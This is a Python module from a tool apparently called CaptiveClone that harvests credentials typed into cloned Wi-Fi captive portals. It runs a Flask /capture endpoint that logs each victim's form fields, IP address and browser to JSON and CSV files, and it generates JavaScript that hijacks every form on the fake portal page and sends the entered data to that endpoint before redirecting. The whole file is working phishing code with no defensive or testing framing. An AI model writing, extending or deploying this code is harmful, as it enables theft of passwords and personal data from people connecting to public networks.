"""
Credential Capture module for CaptiveClone.

This module is responsible for capturing and monitoring credentials submitted to cloned captive portals.
"""

import logging
import os
import json
import time
import threading
import csv
from typing import List, Dict, Optional, Any, Set
from datetime import datetime
from pathlib import Path
import hashlib

from flask import Flask, request, jsonify, abort
from werkzeug.security import generate_password_hash

from captiveclone.utils.exceptions import CaptureError

logger = logging.getLogger(__name__)

class CredentialCapture:
    """
    Captures and monitors credentials submitted to cloned captive portals.
    """
    
    def __init__(self, output_dir: str):
        """
        Initialize the credential capture system.
        
        Args:
            output_dir: Directory to store captured credentials
            
        Raises:
            CaptureError: If output_dir is invalid or can't be created
        """
        self.output_dir = Path(output_dir)
        self.credentials = []
        self.observers = set()  # Set of callback functions to notify
        self.lock = threading.Lock()
        
        # Create output directory if it doesn't exist
        self._ensure_output_dir()
        
        # Create random hash for this capture session
        self.session_id = hashlib.md5(str(time.time()).encode()).hexdigest()[:10]
        
        logger.debug(f"Initialized credential capture with session ID {self.session_id}")
    
    def _ensure_output_dir(self) -> None:
        """
        Ensure the output directory exists.
        
        Raises:
            CaptureError: If the directory can't be created
        """
        try:
            if not self.output_dir.exists():
                self.output_dir.mkdir(parents=True, exist_ok=True)
                
            # Check if we can write to the directory
            test_file = self.output_dir / ".test_write"
            test_file.write_text("test")
            test_file.unlink()
            
        except Exception as e:
            raise CaptureError(f"Failed to create or write to output directory: {str(e)}")
    
    def register_observer(self, callback) -> None:
        """
        Register a callback function to be notified of new credentials.
        
        Args:
            callback: Function to call when new credentials are captured
        """
        self.observers.add(callback)
        logger.debug(f"Registered credential observer, total observers: {len(self.observers)}")
    
    def unregister_observer(self, callback) -> None:
        """
        Unregister a callback function.
        
        Args:
            callback: Function to remove from notification list
        """
        if callback in self.observers:
            self.observers.remove(callback)
            logger.debug(f"Unregistered credential observer, total observers: {len(self.observers)}")
    
    def capture(self, form_data: Dict[str, Any], source_ip: str, user_agent: str, 
                portal_name: str) -> Dict[str, Any]:
        """
        Capture credentials from a form submission.
        
        Args:
            form_data: Dictionary of form data
            source_ip: IP address of the submitter
            user_agent: User agent of the submitter
            portal_name: Name of the captive portal
            
        Returns:
            Dictionary with the captured credential information
        """
        timestamp = datetime.now().isoformat()
        
        # Create credential entry
        credential = {
            "timestamp": timestamp,
            "source_ip": source_ip,
            "portal": portal_name,
            "user_agent": user_agent,
            "form_data": form_data
        }
        
        # Store the credential
        with self.lock:
            self.credentials.append(credential)
            self._write_to_json(credential)
        
        # Notify observers
        self._notify_observers(credential)
        
        logger.info(f"Captured credential from {source_ip} for portal '{portal_name}'")
        
        return credential
    
    def _notify_observers(self, credential: Dict[str, Any]) -> None:
        """
        Notify all registered observers of a new credential.
        
        Args:
            credential: The captured credential information
        """
        for callback in self.observers:
            try:
                callback(credential)
            except Exception as e:
                logger.error(f"Error notifying observer of new credential: {str(e)}")
    
    def _write_to_json(self, credential: Dict[str, Any]) -> None:
        """
        Write a credential to the JSON log file.
        
        Args:
            credential: The captured credential information
        """
        try:
            # Create filename based on session and portal
            filename = f"credentials_{self.session_id}_{credential['portal']}.json"
            filepath = self.output_dir / filename
            
            # Read existing data if file exists
            existing_data = []
            if filepath.exists():
                try:
                    with open(filepath, 'r') as f:
                        existing_data = json.load(f)
                except json.JSONDecodeError:
                    # If file is corrupted, start fresh
                    existing_data = []
            
            # Append new credential
            existing_data.append(credential)
            
            # Write back to file
            with open(filepath, 'w') as f:
                json.dump(existing_data, f, indent=2)
            
        except Exception as e:
            logger.error(f"Failed to write credential to JSON file: {str(e)}")
    
    def export_csv(self, filename: Optional[str] = None) -> str:
        """
        Export captured credentials to a CSV file.
        
        Args:
            filename: Name of the output file (default: auto-generated)
            
        Returns:
            Path to the exported CSV file
        """
        if not filename:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"credentials_{self.session_id}_{timestamp}.csv"
        
        filepath = self.output_dir / filename
        
        try:
            with open(filepath, 'w', newline='') as f:
                # Determine all possible form fields
                form_fields = set()
                for cred in self.credentials:
                    form_fields.update(cred['form_data'].keys())
                
                # Create fieldnames for CSV
                fieldnames = ['timestamp', 'source_ip', 'portal', 'user_agent'] + sorted(list(form_fields))
                
                writer = csv.DictWriter(f, fieldnames=fieldnames)
                writer.writeheader()
                
                # Write each credential
                for cred in self.credentials:
                    row = {
                        'timestamp': cred['timestamp'],
                        'source_ip': cred['source_ip'],
                        'portal': cred['portal'],
                        'user_agent': cred['user_agent']
                    }
                    
                    # Add form data
                    for field in form_fields:
                        row[field] = cred['form_data'].get(field, '')
                    
                    writer.writerow(row)
            
            logger.info(f"Exported {len(self.credentials)} credentials to {filepath}")
            return str(filepath)
            
        except Exception as e:
            logger.error(f"Failed to export credentials to CSV: {str(e)}")
            raise CaptureError(f"Failed to export credentials: {str(e)}")
    
    def get_all_credentials(self) -> List[Dict[str, Any]]:
        """
        Get all captured credentials.
        
        Returns:
            List of all captured credentials
        """
        with self.lock:
            return self.credentials.copy()
    
    def get_recent_credentials(self, count: int = 10) -> List[Dict[str, Any]]:
        """
        Get the most recent credentials.
        
        Args:
            count: Number of credentials to return
            
        Returns:
            List of the most recent credentials
        """
        with self.lock:
            return self.credentials[-count:]


class CaptureEndpoint:
    """
    Flask application to provide a credential capture endpoint.
    """
    
    def __init__(self, capture_manager: CredentialCapture, port: int = 8080):
        """
        Initialize the capture endpoint.
        
        Args:
            capture_manager: Credential capture manager
            port: Port to listen on
        """
        self.capture_manager = capture_manager
        self.port = port
        self.app = Flask(__name__)
        self.running = False
        self.thread = None
        
        # Set up routes
        self._setup_routes()
        
        logger.debug(f"Initialized capture endpoint on port {port}")
    
    def _setup_routes(self) -> None:
        """Set up the Flask routes."""
        
        @self.app.route('/capture', methods=['POST'])
        def capture():
            """Handle credential capture submissions."""
            try:
                # Get form data
                form_data = request.form.to_dict()
                
                # If no form data but JSON data exists, use that
                if not form_data and request.json:
                    form_data = request.json
                
                # Get additional information
                source_ip = request.remote_addr
                user_agent = request.user_agent.string
                portal_name = request.args.get('portal', 'unknown')
                
                # Capture the credential
                credential = self.capture_manager.capture(
                    form_data=form_data,
                    source_ip=source_ip,
                    user_agent=user_agent,
                    portal_name=portal_name
                )
                
                # If next parameter is provided, redirect to it
                next_url = request.args.get('next')
                if next_url:
                    return jsonify({"success": True, "redirect": next_url})
                
                return jsonify({"success": True, "captured": True})
                
            except Exception as e:
                logger.error(f"Error capturing credential: {str(e)}")
                return jsonify({"success": False, "error": str(e)}), 500
        
        @self.app.route('/health', methods=['GET'])
        def health():
            """Health check endpoint."""
            return jsonify({"status": "ok"})
    
    def start(self) -> None:
        """
        Start the capture endpoint server.
        """
        if self.running:
            return
        
        # Start in a separate thread
        self.thread = threading.Thread(
            target=self._run_server,
            daemon=True
        )
        self.thread.start()
        self.running = True
        
        logger.info(f"Started credential capture endpoint on port {self.port}")
    
    def _run_server(self) -> None:
        """Run the Flask server."""
        try:
            self.app.run(
                host='0.0.0.0',
                port=self.port,
                debug=False,
                use_reloader=False
            )
        except Exception as e:
            logger.error(f"Error running capture endpoint: {str(e)}")
    
    def stop(self) -> None:
        """
        Stop the capture endpoint server.
        """
        if not self.running:
            return
        
        # Shut down Flask
        # Note: This is a bit of a hack, but Flask doesn't provide a clean way to stop the server
        func = request.environ.get('werkzeug.server.shutdown')
        if func is None:
            raise RuntimeError('Not running with the Werkzeug server')
        func()
        
        if self.thread:
            self.thread.join(timeout=5)
        
        self.running = False
        logger.info("Stopped credential capture endpoint")


def create_captive_portal_form_handler(capture_url: str, portal_name: str, 
                                      next_url: Optional[str] = None) -> str:
    """
    Create JavaScript code to intercept form submissions and send them to the capture endpoint.
    
    Args:
        capture_url: URL of the capture endpoint
        portal_name: Name of the captive portal
        next_url: URL to redirect to after capture (optional)
        
    Returns:
        JavaScript code to be included in the cloned portal
    """
    js_code = """
    document.addEventListener('DOMContentLoaded', function() {
        // Find all forms in the document
        var forms = document.querySelectorAll('form');
        
        forms.forEach(function(form) {
            form.addEventListener('submit', function(e) {
                e.preventDefault();
                
                var formData = new FormData(form);
                var jsonData = {};
                
                // Convert FormData to JSON
                formData.forEach(function(value, key) {
                    jsonData[key] = value;
                });
                
                // Send the data to the capture endpoint
                fetch('CAPTURE_URL?portal=PORTAL_NAME&next=NEXT_URL', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(jsonData)
                })
                .then(function(response) {
                    return response.json();
                })
                .then(function(data) {
                    if (data.redirect) {
                        window.location.href = data.redirect;
                    } else {
                        // If no redirect URL, submit the form normally
                        form.removeEventListener('submit', arguments.callee);
                        form.submit();
                    }
                })
                .catch(function(error) {
                    console.error('Error:', error);
                    // On error, submit the form normally
                    form.removeEventListener('submit', arguments.callee);
                    form.submit();
                });
            });
        });
    });
    """
    
    # Replace placeholders
    js_code = js_code.replace('CAPTURE_URL', capture_url)
    js_code = js_code.replace('PORTAL_NAME', portal_name)
    js_code = js_code.replace('NEXT_URL', next_url or '')
    
    return js_code 